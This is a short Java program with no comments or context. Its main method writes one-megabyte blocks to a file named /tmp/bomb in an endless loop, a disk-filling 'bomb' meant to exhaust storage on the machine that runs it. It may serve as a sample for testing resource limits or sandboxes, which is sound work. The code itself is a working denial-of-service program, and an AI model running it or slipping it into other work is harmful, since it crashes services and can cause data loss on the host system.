import java.io.FileOutputStream;

public class Main {
    public static void main(String[] args) throws Exception {
        byte[] chunk = new byte[1024 * 1024];
        FileOutputStream fos = new FileOutputStream("/tmp/bomb");
        while (true) {
            fos.write(chunk);
        }
    }
}
